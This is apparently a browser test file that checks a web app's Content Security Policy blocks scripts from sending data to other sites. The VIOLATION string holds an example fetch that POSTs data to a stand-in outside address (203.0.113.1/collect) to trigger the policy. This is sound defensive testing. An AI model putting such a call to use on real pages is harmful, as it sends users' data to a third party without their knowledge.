"""The page may talk only to the app and its API (P1-8c).

js/config.js decides the API's address, so the page's own policy allows
the app and local development servers; Docker's nginx adds a stricter one
(connect-src 'self'), which browsers apply on top.
"""
VIOLATION = """() => new Promise((resolve) => {
    document.addEventListener('securitypolicyviolation', (e) => resolve(e.violatedDirective));
    fetch('http://203.0.113.1/collect', { method: 'POST', body: 'data' }).catch(() => {});
    setTimeout(() => resolve(null), 3000);
})"""


def test_a_script_on_the_page_cannot_send_data_to_another_site(page):
    assert page.evaluate(VIOLATION) == "connect-src"


def test_the_app_still_reaches_its_api(page, account):
    # Signing up (the account fixture) went to the API on another port.
    assert page.locator("#dashboard-page").is_visible()
